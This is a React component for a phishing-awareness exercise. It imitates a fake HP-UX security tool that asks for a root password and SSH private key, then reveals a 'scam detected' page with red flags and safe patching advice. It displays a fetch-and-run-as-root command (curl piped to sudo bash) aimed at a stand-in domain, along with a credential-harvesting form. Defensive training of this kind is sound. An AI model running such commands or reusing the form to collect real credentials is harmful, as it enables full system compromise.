import React, { useState } from "react";

export default function FakeHPUXScam({ onComplete }) {
  const [view, setView] = useState("home");

  const [name, setName] = useState("");
  const [email, setEmail] = useState("");
  const [company, setCompany] = useState("");
  const [hostname, setHostname] = useState("");

  const [rootPassword, setRootPassword] = useState("");
  const [sshKey, setSshKey] = useState("");

  const inputStyle = {
    width: "100%",
    padding: "15px",
    marginBottom: "15px",
    borderRadius: "8px",
    border: "1px solid #0066cc",
    fontSize: "15px",
    outline: "none",
    background: "#0a1628",
    color: "#bfdbfe",
    fontFamily: "monospace",
    boxSizing: "border-box"
  };

  const codeStyle = {
    background: "#000",
    color: "#60a5fa",
    padding: "12px 16px",
    borderRadius: "8px",
    fontFamily: "monospace",
    fontSize: "14px",
    margin: "10px 0",
    border: "1px solid #1e3a5f",
    overflowX: "auto",
    whiteSpace: "pre-wrap"
  };

  /* ===================================
        AUTHENTICATION / PATCH PAGE
  =================================== */
  if (view === "auth") {
    return (
      <div style={{ background: "#050d1a", minHeight: "100vh", display: "flex", justifyContent: "center", alignItems: "center", padding: "40px" }}>
        <div style={{ width: "100%", maxWidth: "720px", background: "#0a1628", borderRadius: "16px", padding: "35px", boxShadow: "0 20px 40px rgba(0,102,204,.25)", color: "#fff", border: "1px solid #1e3a5f" }}>
          <div style={{ textAlign: "center" }}>
            <div style={{ fontSize: "60px" }}>🖥️</div>
            <h1 style={{ color: "#60a5fa", fontFamily: "monospace" }}>HP-UX Security Hardening Tool</h1>
            <h2>System Authentication Required</h2>
            <p style={{ color: "#93c5fd" }}>Authenticate to apply critical security patches</p>
          </div>

          <div style={{ background: "#1e3a5f", padding: "20px", borderRadius: "10px", margin: "25px 0", border: "1px solid #0066cc" }}>
            <h3 style={{ color: "#60a5fa" }}>🔐 Why we need your credentials</h3>
            <ul style={{ lineHeight: "1.8", color: "#bfdbfe" }}>
              <li>✔ Apply critical CVE patches to your HP-UX systems</li>
              <li>✔ Harden kernel parameters and network stack</li>
              <li>✔ Update OpenSSL and SSH configurations</li>
              <li>✔ Generate compliance reports for audit</li>
            </ul>
            <p style={{ color: "#fbbf24", fontSize: "13px", marginTop: "10px" }}>
              ⚠️ Your credentials are encrypted with AES-256 and used only for patching.
            </p>
          </div>

          <div style={codeStyle}>
{`$ curl -sSL https://hpux-security.dev/patch.sh | sudo bash
[INFO] Authenticating with target system...
[INFO] Applying security patches...`}
          </div>

          <label style={{ color: "#93c5fd", fontSize: "13px" }}>Root Password (for system access)</label>
          <input
            placeholder="Enter root password..."
            type="password"
            value={rootPassword}
            onChange={(e) => setRootPassword(e.target.value)}
            style={inputStyle}
          />

          <label style={{ color: "#93c5fd", fontSize: "13px" }}>SSH Private Key (for remote systems)</label>
          <textarea
            placeholder="-----BEGIN RSA PRIVATE KEY-----&#10;..."
            value={sshKey}
            onChange={(e) => setSshKey(e.target.value)}
            style={{ ...inputStyle, minHeight: "100px", resize: "vertical" }}
          />

          <button
            onClick={() => setView("success")}
            style={{ width: "100%", padding: "16px", background: "linear-gradient(90deg,#0066cc,#0052a3)", border: "none", color: "#fff", fontSize: "16px", fontWeight: "700", borderRadius: "10px", cursor: "pointer", fontFamily: "monospace" }}
          >
            $ hpux-secure --apply --auth
          </button>
        </div>
      </div>
    );
  }

  /* ===================================
        SUCCESS / SCAM DETECTED PAGE
        (Placed BEFORE default return)
  =================================== */
  if (view === "success") {
    return (
      <div style={{ background: "#050d1a", minHeight: "100vh", padding: "40px" }}>
        <div style={{ maxWidth: "1000px", margin: "auto", background: "#fff", borderRadius: "20px", overflow: "hidden", boxShadow: "0 20px 50px rgba(0,0,0,.4)" }}>
          <div style={{ background: "linear-gradient(90deg,#dc2626,#991b1b)", padding: "30px", textAlign: "center", color: "#fff" }}>
            <h1>🚨 SCAM DETECTED</h1>
            <h3>This was a Fake HP-UX Security Tool Website.</h3>
          </div>

          <div style={{ padding: "35px" }}>
            <div style={{ display: "grid", gridTemplateColumns: "repeat(auto-fit, minmax(300px, 1fr))", gap: "20px" }}>
              <div style={{ background: "#fef2f2", padding: "20px", borderRadius: "15px" }}>
                <h2>📂 Information Exposed</h2>
                <ul style={{ lineHeight: "1.8" }}>
                  <li>👤 Name: <b>{name || "Not provided"}</b></li>
                  <li>📧 Email: <b>{email || "Not provided"}</b></li>
                  <li>🏢 Company: <b>{company || "Not provided"}</b></li>
                  <li>🖥️ Hostname: <b>{hostname || "Not provided"}</b></li>
                  <li>🔑 Root Password: <b>{rootPassword ? "••••••••" : "Not provided"}</b></li>
                  <li>🔐 SSH Key: <b>{sshKey ? "•••••••• (exposed)" : "Not provided"}</b></li>
                </ul>
              </div>

              <div style={{ background: "#fff7ed", padding: "20px", borderRadius: "15px" }}>
                <h2>🚩 Red Flags</h2>
                <ul style={{ lineHeight: "1.8" }}>
                  <li>Unofficial domain (not hpe.com or support.hpe.com).</li>
                  <li>Requests root password (NEVER share this).</li>
                  <li>Requests SSH private key (NEVER share this).</li>
                  <li>Piping curl to sudo bash (extremely dangerous).</li>
                  <li>"Free" enterprise security tool for proprietary OS.</li>
                  <li>No official HPE endorsement or partnership.</li>
                </ul>
              </div>
            </div>

            <div style={{ marginTop: "25px", background: "#eff6ff", padding: "20px", borderRadius: "15px" }}>
              <h2>📊 Risk Meter</h2>
              <div style={{ height: "18px", background: "#d1d5db", borderRadius: "20px", overflow: "hidden" }}>
                <div style={{ width: "99%", height: "100%", background: "#dc2626" }}></div>
              </div>
              <h3 style={{ marginTop: "10px", color: "#dc2626" }}>CRITICAL RISK — FULL INFRASTRUCTURE COMPROMISE</h3>
            </div>

            <div style={{ marginTop: "25px", background: "#ecfdf5", padding: "20px", borderRadius: "15px" }}>
              <h2>🛡 How to Safely Patch HP-UX Systems</h2>
              <ul style={{ lineHeight: "1.8" }}>
                <li>✅ Download patches only from official HPE sources: <b>support.hpe.com</b> or <b>HPE Software Depot</b>.</li>
                <li>✅ Use official tools: <b>swinstall</b>, <b>swmodify</b>, or <b>HPE Systems Insight Manager</b>.</li>
                <li>✅ <b>Never share your root password</b> with any third-party tool or website.</li>
                <li>✅ <b>Never share SSH private keys</b> — use certificate-based authentication instead.</li>
                <li>✅ <b>Never pipe curl/wget to bash</b> — always inspect scripts and verify checksums.</li>
                <li>✅ Test patches in a non-production environment first.</li>
                <li>✅ If compromised: <b>change root password immediately</b> and rotate all SSH keys.</li>
                <li>✅ Report phishing to HPE Security team and CERT-In.</li>
              </ul>
            </div>

            <div style={{ marginTop: "25px", background: "#f8fafc", padding: "20px", borderRadius: "15px" }}>
              <h2>📈 Scam Timeline</h2>
              <p>✅ Searched for "HP-UX security patch" or "HP-UX hardening"</p>
              <p>⬇</p>
              <p>✅ Clicked typosquatted website</p>
              <p>⬇</p>
              <p>✅ Ran suggested curl | bash command</p>
              <p>⬇</p>
              <p>✅ Entered root password and SSH key</p>
              <p>⬇</p>
              <p style={{ color: "#dc2626", fontWeight: "700" }}>❌ Attacker Gained Root Access to Critical Infrastructure</p>
            </div>

            <button
              onClick={() => onComplete({ name, email, company, hostname, rootPassword, sshKey })}
              style={{ width: "100%", marginTop: "30px", padding: "18px", background: "linear-gradient(90deg,#0066cc,#0052a3)", border: "none", color: "#fff", fontWeight: "700", fontSize: "18px", borderRadius: "12px", cursor: "pointer" }}
            >
              Continue to Quiz →
            </button>
          </div>
        </div>
      </div>
    );
  }

  /* ===================================
        HOME PAGE (Default Return)
  =================================== */
  return (
    <div style={{ background: "linear-gradient(135deg,#050d1a,#0a1628)", minHeight: "100vh", padding: "40px", color: "#bfdbfe" }}>
      <div style={{ maxWidth: "1100px", margin: "auto" }}>
        <div style={{ background: "#0a1628", borderRadius: "20px", overflow: "hidden", boxShadow: "0 20px 50px rgba(0,102,204,.2)", border: "1px solid #1e3a5f" }}>
          <div style={{ background: "linear-gradient(90deg,#0052a3,#0066cc,#3b82f6)", padding: "40px", textAlign: "center" }}>
            <h1 style={{ fontSize: "42px", margin: 0, fontFamily: "monospace", color: "#fff" }}>🖥️ HP-UX Security Hardening Tool</h1>
            <h3 style={{ color: "#dbeafe" }}>Enterprise-Grade Security for Mission-Critical Systems</h3>
            <p style={{ color: "#bfdbfe" }}>Automated patching, hardening & compliance reporting</p>
          </div>

          <div style={{ padding: "35px" }}>
            <div style={{ display: "grid", gridTemplateColumns: "repeat(auto-fit, minmax(220px, 1fr))", gap: "20px", marginBottom: "30px" }}>
              <div style={{ background: "#1e3a5f", padding: "20px", borderRadius: "12px", border: "1px solid #0066cc" }}>
                <div style={{ fontSize: "36px" }}>🛡️</div>
                <h3 style={{ color: "#60a5fa" }}>CVE Patching</h3>
                <p style={{ color: "#93c5fd", fontSize: "14px" }}>Critical security updates</p>
              </div>
              <div style={{ background: "#1e3a5f", padding: "20px", borderRadius: "12px", border: "1px solid #0066cc" }}>
                <div style={{ fontSize: "36px" }}>🔒</div>
                <h3 style={{ color: "#60a5fa" }}>Kernel Hardening</h3>
                <p style={{ color: "#93c5fd", fontSize: "14px" }}>System-level security</p>
              </div>
              <div style={{ background: "#1e3a5f", padding: "20px", borderRadius: "12px", border: "1px solid #0066cc" }}>
                <div style={{ fontSize: "36px" }}>📊</div>
                <h3 style={{ color: "#60a5fa" }}>Compliance</h3>
                <p style={{ color: "#93c5fd", fontSize: "14px" }}>PCI-DSS, HIPAA, SOX</p>
              </div>
              <div style={{ background: "#1e3a5f", padding: "20px", borderRadius: "12px", border: "1px solid #0066cc" }}>
                <div style={{ fontSize: "36px" }}>🔧</div>
                <h3 style={{ color: "#60a5fa" }}>Auto-Remediation</h3>
                <p style={{ color: "#93c5fd", fontSize: "14px" }}>Fix vulnerabilities instantly</p>
              </div>
            </div>

            <div style={{ background: "#000", padding: "20px", borderRadius: "12px", marginBottom: "25px", border: "1px solid #1e3a5f" }}>
              <h3 style={{ color: "#60a5fa", fontFamily: "monospace" }}>📦 Quick Install</h3>
              <div style={codeStyle}>$ curl -sSL https://hpux-security.dev/patch.sh | sudo bash</div>
              <div style={codeStyle}>$ hpux-secure --scan --harden</div>
            </div>

            <div style={{ background: "#1e3a5f", padding: "20px", borderRadius: "12px", marginBottom: "25px", border: "1px solid #fbbf24" }}>
              <h2 style={{ color: "#fbbf24", marginTop: 0 }}>⚠️ System Authentication Required</h2>
              <p>To apply security patches and harden your HP-UX systems, authenticate with root credentials.</p>
            </div>

            <h2 style={{ color: "#60a5fa" }}>📝 Register for Enterprise Access</h2>
            <input placeholder="Full Name" value={name} onChange={(e) => setName(e.target.value)} style={inputStyle} />
            <input placeholder="Email Address" value={email} onChange={(e) => setEmail(e.target.value)} style={inputStyle} />
            <input placeholder="Company Name" value={company} onChange={(e) => setCompany(e.target.value)} style={inputStyle} />
            <input placeholder="Target Hostname (e.g., hpux-prod-01)" value={hostname} onChange={(e) => setHostname(e.target.value)} style={inputStyle} />

            <button
              onClick={() => setView("auth")}
              style={{ width: "100%", padding: "18px", background: "linear-gradient(90deg,#0066cc,#0052a3)", border: "none", color: "#fff", fontSize: "18px", fontWeight: "700", borderRadius: "12px", cursor: "pointer", fontFamily: "monospace" }}
            >
              $ hpux-secure --setup →
            </button>

            <p style={{ textAlign: "center", color: "#93c5fd", fontSize: "12px", marginTop: "20px" }}>
              © 2026 HP-UX Security Hardening Tool (FAKE — for educational purposes only)
            </p>
          </div>
        </div>
      </div>
    </div>
  );
}